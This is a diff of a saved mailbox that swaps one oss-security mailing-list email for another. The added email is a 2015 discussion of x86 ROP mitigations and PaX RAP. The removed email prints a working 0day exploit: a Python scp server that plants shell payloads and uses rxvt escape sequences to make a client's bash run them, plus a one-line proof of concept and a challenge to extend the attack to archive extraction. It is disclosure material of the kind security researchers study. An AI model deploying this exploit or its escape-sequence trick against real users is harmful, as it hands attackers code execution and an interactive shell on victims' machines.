@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6746" "Monday" "17" "May" "2021" "16:49:04" "+0300" "def" "def@huumeet.info" nil "170" "[oss-security] rxvt terminal (+bash) remoteish code execution 0day" nil nil nil "5" nil nil (number mark "U       def@huumeet. May 17  170/6746  " thread-indent "\"[oss-security] rxvt terminal (+bash) remoteish code execution 0day\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] rxvt terminal (+bash) remoteish code execution 0day" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3157" "Tuesday" "17" "November" "2015" "22:13:29" "-0500" "Daniel Micay" "danielmicay@gmail.com" "<564BECD9.4070407@gmail.com>" "65" "Re: [oss-security] Re: Fwd: x86 ROP mitigation" nil nil nil "11" "2015111803:13:29" "[oss-security] Re: Fwd: x86 ROP mitigation" (number mark "U       danielmicay@ Nov 17   65/3157  " thread-indent "\"Re: [oss-security] Re: Fwd: x86 ROP mitigation\"\n") "<20151117221139.GE3818@brightrain.aerifal.cx>" ("<20151117153951.GA28672@openwall.com>" "<564B52D6.9090205@t-online.de>" "<564B54BA.6090203@redhat.com>" "<564B6536.2030908@redhat.com>" "<564B7757.6080100@gmail.com>" "<20151117221139.GE3818@brightrain.aerifal.cx>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14328 invoked by uid 550); 17 May 2021 13:55:25 -0000
+Received: (qmail 19726 invoked by uid 550); 18 Nov 2015 03:13:58 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,184 +12,100 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6066 invoked from network); 17 May 2021 13:49:15 -0000
-Date: Mon, 17 May 2021 16:49:04 +0300
-From: def <def@huumeet.info>
+Received: (qmail 19705 invoked from network); 18 Nov 2015 03:13:57 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=subject:to:references:from:message-id:date:user-agent:mime-version
+         :in-reply-to:content-type;
+        bh=RRyjiDe3+hztE1ws6jgIBljjshzX/dzd215GiL3mq3Q=;
+        b=Hfg+ja2lRR4eDeUGkEqPJv3vUVZONHhGoZZaebToMsoqcj+lY9YZFhoxlmXwk1wcXu
+         zVvCWVrKi8bq1DGRTBoCp8JmkAtuPvkhfZpvg7aKtZ82taza186oserBevja0yVZc0R6
+         Vos/kjsDQC+TSOyhFyE8bdPma0O9JoxBZO+jm/5iwLp0Grq9Fnmfh506XRb68bqoX5lK
+         cN6jkePeAj+dsdtL8CF21FeMsSTiCpJV0xuNopYPm/F8xtrBKK+6Zl0pTQmERb+2VFg2
+         9UnnvIwlayod1ZgC476bv/T2b2Ny2DGQVDEiS0wP8fEsk53nPNcUfHi+/Pgc83D7cIhA
+         Z+Cw==
+X-Received: by 10.140.128.87 with SMTP id 84mr19403924qha.54.1447816425541;
+        Tue, 17 Nov 2015 19:13:45 -0800 (PST)
 To: oss-security@lists.openwall.com
-Message-ID: <20210517134904.GA24667@huumeet.info>
+References: <20151117153951.GA28672@openwall.com>
+ <564B52D6.9090205@t-online.de> <564B54BA.6090203@redhat.com>
+ <564B6536.2030908@redhat.com> <564B7757.6080100@gmail.com>
+ <20151117221139.GE3818@brightrain.aerifal.cx>
+From: Daniel Micay <danielmicay@gmail.com>
+X-Enigmail-Draft-Status: N1110
+Message-ID: <564BECD9.4070407@gmail.com>
+Date: Tue, 17 Nov 2015 22:13:29 -0500
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
+ Thunderbird/38.3.0
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-User-Agent: Mutt/1.10.1 (2018-07-13)
-Subject: [oss-security] rxvt terminal (+bash) remoteish code execution 0day
+In-Reply-To: <20151117221139.GE3818@brightrain.aerifal.cx>
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="UodS4cT59XmJfe2JQAGUJnmK6pfMtcprn"
+Subject: Re: [oss-security] Re: Fwd: x86 ROP mitigation
 
-#!/usr/bin/env python
-# Title: rxvt (remote) code execution over scp with $SHELL=/bin/bash (0day)
-# Version: rxvt 2.7.10, rxvt-unicode 9.22, mrxvt 0.5.4, eterm 0.9.7
-# Author: def <def@huumeet.info>
-# Date: 2021-05-17
-# CVE: N/A
-#
-#------------------------------------------------------------------------------
-# (U)RXVT VULNERABILITY
-#
-# In rxvt-based terminals, ANSI escape sequence ESC G Q (\eGQ, \033GQ, \x1bGQ)
-# queries the availability of graphics and the response is received from stdin.
-# However, rxvt responds to the query with a newline-terminated message, which
-# is retarded and exposes goatse-wide gaping security holes in many popular CLI
-# programs when executed inside an rxvt terminal window.
-#
-# [def@arch ~]$ printf '\eGQ'
-# ^[G0
-# [def@arch ~]$ 0
-# bash: 0: command not found
-#
-# The latter command (i.e., 0) executes automatically without user interaction.
-# The contents of the second command can be somewhat controlled by chaining the
-# printf message with other escape sequences. In particular, a VT52 mode escape
-# sequence \eZ prepends a letter Z and triggers bash's tab completion, allowing
-# the construction of relative paths and, therefore, code execution in the form
-# of running (planted) files from subdirectories in the current directory.
-#
-# URXVT (+BASH) CODE EXECUTION PROOF-OF-CONCEPT -------------------------------
-#
-# % mkdir -p ZZZ && echo 'uname -a; id; date; sh -i' >ZZZ/0 && chmod +x ZZZ/0
-# % urxvt -e bash
-#
-# [def@arch ~]$ printf '\e[?2l\eZ\e<\eGQ'
-# ^[/Z^[G0
-# [def@arch ~]$ ZZZ/0
-# Linux 5.11.1-arch-1 #1 SMP PREEMPT Tue, 23 Feb 2021 14:05:30 x86_64 GNU/Linux
-# uid=1000(def) gid=1001(def) groups=1001(def),43(tor),998(wheel),999(adm)
-# Sun Apr 18 04:25:22 AM EEST 2021
-# sh-5.1$
-#
-# FIX -------------------------------------------------------------------------
-#
-# Don't use rxvt or any of its derivatives. Stay the fuck away from xterm also.
-#
-# st(1) is a viable solution if you ever plan to `cat /var/log/access.log` or
-# otherwise handle untrusted data from questionable sources.
-#
-#------------------------------------------------------------------------------
+--UodS4cT59XmJfe2JQAGUJnmK6pfMtcprn
+Content-Type: text/plain; charset=windows-1252
+Content-Transfer-Encoding: quoted-printable
 
-import logging
-import paramiko
-import socket
-import threading
-logging.basicConfig(level=logging.INFO)
+On 17/11/15 05:11 PM, Rich Felker wrote:
+> On Tue, Nov 17, 2015 at 01:52:07PM -0500, Daniel Micay wrote:
+>> Is that really the right approach vs. preventing hijacking of flow
+>> control via return pointers and function pointers? It doesn't really
+>> seem like there's an end game in mind where it actually prevents ROP
+>> rather than just removing many useful gadgets. Making useful ROP gadgets
+>> harder to find doesn't mean much, since tools are used to find them and
+>> the tools can be improved if it becomes necessary.
+>>
+>> i.e. why not just go with something like PaX's RAP
+>=20
+> My understanding is that it's not ABI-compatible with non-RAP code, so
+> you'd essentially be going with a whole new ABI. If so, this is going
+> to be completely impractical for most users. Am I mistaken?
 
-"""
-This script implements a scp server that exploits insecure ANSI escape sequence
-handling in client's (u)rxvt terminal (and bash shell). A recursive (-r) copy
-into the current directory leads to code execution. For example:
+AFAIK, it's ABI compatible with code compiled with it. Hard to say since
+the implementation is not yet public. You do need to use it everywhere
+to truly take advantage of it though. It might still protect the
+function pointers reachable by the attacker without full coverage but...
+that's not at all ideal.
 
-    $ scp -r -P2222 user@localhost:/backup/or/whatever/ .
+Mitigations like this aren't comparable to ones providing incomplete
+detection of memory corruption like _FORTIFY_SOURCE where even a small
+amount of coverage can end up preventing vulnerabilities from being
+exploited. A ROP migitation is only removing an exploitation technique /
+making exploitation unreliable (hopefully enough that it can't be brute
+forced) / requiring additional bugs to work around it so... it's no good
+if there are easy ways around it for an attacker. It actually has to
+enforce something meaningful.
 
-The above command transfers payload files ZZZ/0, ZZZ/1 and ZZZ/Z0 to the client
-and executes one of them (the executed payload depends on the rxvt version).
-"""
+RAP is essentially breaking the exploitation technique across the board.
+It's not insurmountable but it's not incomplete either. And it can be
+improved from the meaningful starting point. It's really hard to see how
+removing all usable ROP gadgets can succeed. Maybe it can, but it's hard
+to believe without seeing a compelling roadmap.
 
-bind = ('localhost', 2222)
-payload = '#!/bin/sh\nuname -a; id; date; sh -i\n'
 
-class ScpExploitServer(paramiko.ServerInterface):
-    def __init__(self):
-        self.event = threading.Event()
+--UodS4cT59XmJfe2JQAGUJnmK6pfMtcprn
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
 
-    def get_allowed_auths(self, username):
-        return "password"
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
 
-    def check_auth_none(self, username):
-        logging.info('Authenticating as %s', username)
-        return paramiko.AUTH_SUCCESSFUL
+iQIcBAEBCAAGBQJWS+zZAAoJEPnnEuWa9fIqK3sP/17TWemGaZDQVixM7TjTMUe6
+U3BsBY0OSIDl66RLkndR08QgXLIuF6gVV9t1zuOObajGeixfRcIB2SqFeYuzYX88
+6cJ4L3gsVVD+M9tdmMm61D1OVHi+EGUMpC4CHgySGxk8xe0NA9KdpfvB70148kas
+pjDAjQHAMFvQOg5zZ+SBscovY4c7B7wiylFqhtLRe03sGqYMnpV69STl5FoSjplp
+fJ2pOo3MP7DW8zQon3k/xV7wdEROjmpxqSPjpb5gULvCbfSzGfNt0wfVNK6zAvZA
+7STE6HzJuCnhdbhr17W4BqFqaFeFR+OMws2Tbdiezrf7w/kbbN8Sxc93u714Yvz4
+tYEESm0XRg3Bsx/BpL5TQ36cM1ZKjBqZSxFgf4S9uPDJZAh+oLP4TEQbTAgkYncR
+87uJPdvDObO9ZlTSKb1gYxno34ZfZvyqXBvmQ0fmtgplwg6gcbok0tXwsjBKudME
+YkO9eXb+zV0B9qy2E4Jv9ekK6ldGQWuWUJaVvTIj+L8idNwZRlpTayznoCISxDi1
+HmslCkEyhsSm0ajD5tYHvnjGRVCXG+YUfp6W+FGYmFoX0x+y7ycv3fk7nQG9cagp
+z8P80nZchSWjrHoYaMMWiXbKaZoVZVXoyw1Nw5w2XjAS0oDW9Au8qe6TNqa8iXdZ
+WiAw63C41UrTk/gfPpPm
+=PoIP
+-----END PGP SIGNATURE-----
 
-    def check_auth_password(self, username, password):
-        logging.info('Authenticating with %s:%s', username, password)
-        return paramiko.AUTH_SUCCESSFUL
-
-    def check_channel_request(self, kind, chanid):
-        logging.info('Opening %s channel %d', kind, chanid)
-        if kind != "session":
-            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-        return paramiko.OPEN_SUCCEEDED
-
-    def check_channel_exec_request(self, channel, command):
-        chanid, command = channel.get_id(), command.decode('ascii')
-        logging.info('Approving channel %d exec request: %s', chanid, command)
-        parts = command.split()
-        assert len(parts) > 2 and parts[0] == 'scp' and '-f' in parts
-        threading.Thread(target=self.exploit, args=[channel]).start()
-        return True
-
-    def exploit(self, channel):
-        def wait(): assert channel.recv(4096) == b'\x00'
-        def send(): channel.sendall(b'\x00')
-        fdir, fname0, fname1, fname2 = 'ZZZ', '0', '1', 'Z0'
-        wait()
-
-        # (1) Create subdirectory './ZZZ/'
-        logging.info('Enter "%s/" (channel %d)', fdir, channel.get_id())
-        command = 'D0755 0 {}\n'.format(fdir).encode('ascii')
-        channel.sendall(command)
-        wait()
-
-        # (2) Save the payload as './ZZZ/0', './ZZZ/1' and './ZZZ/Z0'
-        logging.info('Send file "%s" (channel %d)', fname0, channel.get_id())
-        command = 'C0755 {} {}\n'.format(len(payload), fname0).encode('ascii')
-        channel.sendall(command)
-        wait()
-        channel.sendall(payload)
-        send()
-        wait()
-        #channel.sendall_stderr("\x1b[1A".encode('ascii'))
-
-        logging.info('Send file "%s" (channel %d)', fname1, channel.get_id())
-        command = 'C0755 {} {}\n'.format(len(payload), fname1).encode('ascii')
-        channel.sendall(command)
-        wait()
-        channel.sendall(payload)
-        send()
-        wait()
-        #channel.sendall_stderr("\x1b[1A".encode('ascii'))
-
-        logging.info('Send file "%s" (channel %d)', fname2, channel.get_id())
-        command = 'C0755 {} {}\n'.format(len(payload), fname2).encode('ascii')
-        channel.sendall(command)
-        wait()
-        channel.sendall(payload)
-        send()
-        wait()
-
-        # (3) Run the payload with ANSI escapes sequences (in (u)rxvt + bash)
-        channel.sendall_stderr("\033[?2l\033Z\033<\033GQ".encode('ascii'))
-        channel.sendall_stderr("\x1b[1A".encode('ascii'))
-        channel.close()
-
-if __name__ == '__main__':
-    logging.info('Creating a temporary RSA host key ...')
-    host_key = paramiko.rsakey.RSAKey.generate(1024)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(bind)
-    sock.listen(0)
-    logging.info('Listening at %s:%d ...', bind[0], bind[1])
-    while True:
-        try:
-            client, addr = sock.accept()
-            logging.info('Received connection from %s:%s', *addr)
-            transport = paramiko.Transport(client)
-            transport.add_server_key(host_key)
-            transport.start_server(server=ScpExploitServer())
-        except Exception as ex:
-            logging.error('Connection closed: %s', ex)
-        except KeyboardInterrupt:
-            logging.info('Stopping server')
-            break
-
-#------------------------------------------------------------------------------
-# EXERCISE FOR THE READER
-#
-# Achieve code execution in `unrar x foo.rar` / `busybox tar -xvf bar.tar` with
-# an archive containing payload(s) and a trigger file named "\e[?2l\eZ\e<\eGQ".
-#------------------------------------------------------------------------------
+--UodS4cT59XmJfe2JQAGUJnmK6pfMtcprn--
